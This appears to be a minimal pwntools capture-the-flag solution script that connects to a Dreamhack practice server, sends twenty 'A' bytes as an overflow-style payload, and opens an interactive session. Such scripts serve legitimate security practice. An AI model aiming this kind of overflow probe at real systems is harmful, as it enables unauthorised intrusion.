from pwn import *

p = remote('host3.dreamhack.games', 20405)

p.send(b'A' * 20)

p.interactive()